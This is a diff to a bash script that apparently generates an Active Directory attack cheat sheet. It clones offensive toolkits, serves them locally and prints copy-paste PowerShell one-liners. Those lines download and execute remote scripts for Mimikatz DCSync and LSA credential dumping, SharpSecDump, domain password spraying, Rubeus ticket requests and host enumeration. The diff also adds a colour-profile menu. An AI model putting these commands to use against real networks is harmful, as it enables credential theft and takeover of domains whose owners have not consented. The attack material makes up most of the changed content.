@@ -69,6 +69,17 @@ WHITE='\033[01;37m'
 IBLUE='\033[02;34m'
 ICYAN='\033[02;36m'
 
+Colour_Profile_1(){
+
+
+IBLUE='\033[00;31m' # Red
+YELLOW='\033[00;36m' # Cyan
+
+Main_Menu
+
+
+}
+
 
 ################################################################################
 # Public Repo List                                                             #
@@ -77,6 +88,7 @@ ICYAN='\033[02;36m'
 
 adPEASRepo="https://raw.githubusercontent.com/61106960/adPEAS/main/";
 BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
+DCSyncToHashcatRepo="https://raw.githubusercontent.com/The-Viper-One/DCSync-To-Hashcat/main/";
 DomainPasswordSprayRepo="https://raw.githubusercontent.com/The-Viper-One/DomainPasswordSpray/master/"
 EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
 GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
@@ -87,7 +99,6 @@ InvokeTheHashRepo="https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheH
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
-PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
 PowerSharpPackRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/";
 PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
 PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
@@ -111,21 +122,22 @@ cd $HOME/ADAT
 
 # Set local repo locations in the ADAT folder.
 
-adPEASLocalRepo="$HOME/ADAT/adPEAS"
+adPEASLocalRepo="$HOME/ADAT/adPEAS/adPEASRepo"
 BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
 Certificate="$HOME/ADAT/LocalRepo"
 DomainPasswordSprayLocalRepo="$HOME/ADAT/DomainPasswordSpray"
+DCSyncToHashcatRepo="$HOME/ADAT/DCSync-To-Hashcat"
 EmpireLocalRepo="$HOME/ADAT/Empire"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 InveighLocalRepo="$HOME/ADAT/Inveigh"
 InvokeTheHashLocalRepo="$HOME/ADAT/Invoke-TheHash"
-InvokeNoPacLocalRepo="$HOME/ADAT/Invoke-NoPac"
+InvokeNoPacLocalRepo="$HOME/ADAT/InvokeNoPacRepo"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
-PowerSharpPackLocalRepo="$HOME/ADAT/PowerSharpBinaries"
+PowerSharpPackLocalRepo="$HOME/ADAT/PowerSharpPack/PowerSharpBinaries"
 PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
 PowersploitLocalRepo="$HOME/ADAT/Powersploit"
-S3cur3Th1sSh1tCredsLocalRepo="$HOME/ADAT/S3cur3Th1sSh1t"
+S3cur3Th1sSh1tCredsLocalRepo="$HOME/ADAT/S3cur3Th1sSh1tCreds"
 
 
 if [ -d "$EmpireLocalRepo" ] 
@@ -153,22 +165,6 @@ else
 	echo -e ""
 	echo -e "${LGREEN}Cloning Nishang Repo${RESTORE}"
 	git clone --recursive "https://github.com/samratashok/nishang.git" $HOME/ADAT/nishang
-	echo -e ""
-fi
-
-
-
-if [ -d "$PowerSploitLocalRepo" ] 
-then
-	echo -e ""
-    	echo -e "PowerSploit is installed, checking if updated to latest version."
-    	cd $PowerSploitLocalRepo
-    	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
-    	echo -e ""
-else
-	echo -e ""
-	echo -e "${LGREEN}Cloning PowerSploit Repo${RESTORE}"
-	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/PowerSploit
 	echo -e ""
 fi
 
@@ -322,7 +318,21 @@ then
 else
 	echo -e ""
 	echo -e "${LGREEN}Cloning Invoke-TheHash Repo${RESTORE}"
-	git clone --recursive "https://github.com/Kevin-Robertson/Invoke-TheHash.git" $HOME/ADAT/InvokeTheHashRepo
+	git clone --recursive "https://github.com/Kevin-Robertson/Invoke-TheHash.git" $HOME/ADAT/Invoke-TheHash
+	echo -e ""
+fi
+
+if [ -d "$DCSyncToHashcatRepo" ] 
+then
+	echo -e ""
+    	echo -e "DCSync-To-Hashcat is installed, checking if updated to latest version."
+    	cd $DCSyncToHashcatRepo
+    	git pull "https://github.com/The-Viper-One/DCSync-To-Hashcat.git"
+    	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning DCSync-To-Hashcat Repo${RESTORE}"
+	git clone --recursive "https://github.com/The-Viper-One/DCSync-To-Hashcat.git" $HOME/ADAT/DCSync-To-Hashcat
 	echo -e ""
 fi
 
@@ -333,7 +343,6 @@ cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSharpPack/PowerSharpBinaries/* $HOME/ADAT/LocalRepo
@@ -342,7 +351,8 @@ cp -r $HOME/ADAT/DomainPasswordSpray/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/S3cur3Th1sSh1tCreds/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/InvokeNoPacRepo/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/adPEASRepo/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/InvokeTheHashRepo/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Invoke-TheHash/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/DCSync-To-Hashcat/* $HOME/ADAT/LocalRepo
 
 # Set script repo locations to local IP and Port
 
@@ -361,6 +371,7 @@ PowerSharpPackRepo="http://$LocalIP:$LocalPort/"
 InveighRepo="http://$LocalIP:$LocalPort/"
 DomainPasswordSprayRepo="http://$LocalIP:$LocalPort/"
 InvokeNoPacRepo="http://$LocalIP:$LocalPort/"
+DCSyncToHashcatRepo="http://$LocalIP:$LocalPort/"
 InvokeTheHashRepo="http://$LocalIP:$LocalPort/"
 adPEASRepo="http://$LocalIP:$LocalPort/"
 LocalRepo="True"
@@ -489,6 +500,7 @@ echo -ne " What would you like to do?
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
 	        e|E)	Internal_Menu_CVEs ;;
 	        l|L)	Internal_Menu_Host_Local ;;
+	        q|q)	Main_Menu ;;
 		0) exit 0 ;;
 		*) Internal_Menu_Main;;
         esac
@@ -690,7 +702,7 @@ echo -e "${LBLUE}#6: Load Invoke-Rubeus into memory${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus"
 echo -e ""
 echo -e "${LBLUE}#7: Request a TGT with the altname and certificate${RESTORE}"
-echo -e "Invoke-Rubeus -Command "\"asktgt /user:administrator /certificate:cert.pfx /password:Password /nowrap"\""
+echo -e "Invoke-Rubeus -Command "\"asktgt /user:[Username] /certificate:cert.pfx /password:[Password] /nowrap"\""
 echo -e ""
 echo -e "${LBLUE}#8: Load the Base64 encoded ticket into current PowerShell session${RESTORE}"
 echo -e "Invoke-Rubeus -Command "\"ptt /ticket:doIF9jCCBfKgA..[Snip]"\""
@@ -867,7 +879,7 @@ echo -e ""
 echo -e "${IBLUE}SharpSecDump${RESTORE}"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSecDump.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=[Username] -p=[Password] -d=[Domain]"\""
 echo -e ""
 echo -e ""
 echo -e "${LGREEN}Dump clear text credentials${RESTORE}"
@@ -903,12 +915,12 @@ echo -e ""
 echo -e ""      
 echo -e "${LGREEN}NTDS${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}Invoke-DCSync${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-DCSync.ps1);Invoke-DCSync"
+echo -e "${IBLUE}Invoke-DCSyncTH${RESTORE}"
+echo -e "$DownloadMethod "$DCSyncToHashcatRepo"DCSync-To-Hashcat.ps1);Invoke-DCSyncTH"
 echo -e ""
 echo -e "${IBLUE}Mimikatz${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:all"\"'"
-echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:krbtgt"\"'"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:[Domain] /user:all"\"'"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:[Domain] /user:[User]"\"'"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::lsa /inject"\"'"
 echo -e ""
 echo -e ""
@@ -1360,10 +1372,16 @@ echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);
 echo -e ""
 echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
-echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all | Out-file SbResults.txt"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=user"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=system"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=remote"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=misc"
 echo -e ""
 echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
+echo -e ""
+echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
 echo -e ""
 echo -e "${IBLUE}JAWS${RESTORE}"
 echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
@@ -2179,12 +2197,12 @@ echo -e "${LGREEN}Password Spraying${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-SprayEmptyPassword${RESTORE}"
 echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword"
-echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword -Domain Security.local -OutFile EmptyPasswordUsers.txt"
+echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword -Domain [Domain] -OutFile EmptyPasswordUsers.txt"
 echo -e ""
 echo -e "${IBLUE}Domain Password Spray${RESTORE}"
 echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray"
-echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -Password Winter2022"
-echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt"
+echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -Password [Password]"
+echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -UsernameAsPassword"
 echo -e ""
 echo -e "${IBLUE}Rubeus${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /password:Password123 /noticket /nowrap"\""
@@ -3528,6 +3546,31 @@ echo -ne "
 
 }
 
+Colour_Profiles_Menu(){
+
+    clear
+
+echo -ne "
+            Colour Profiles Menu
+
+        1) -> Colour Profile #1
+        2) -> Colour Profile #2
+
+        Q) -> Previous Menu
+"
+
+        read a
+        case $a in
+	        1) 	Colour_Profile_1 ;;
+	        2) 	Colour_Profile_2 ;;
+	        q|Q)	Main_Menu;;
+		0) 	exit 0 ;;
+		*) 	Colour_Profiles_Menu;;
+        esac
+
+
+
+}
 
 Main_Menu(){
 
@@ -3538,11 +3581,14 @@ echo -ne "
 
         1) -> Internal (Windows Commands)
         2) -> External (Linux Commands)
+        
+        3) -> Colour Profiles
 "
         read a
         case $a in
 	        1) Internal_Menu_Main ;;
 	        2) External_Menu_Options ;;
+	        3) Colour_Profiles_Menu ;;
 		0) exit 0 ;;
 		*) Main_Menu;;
         esac
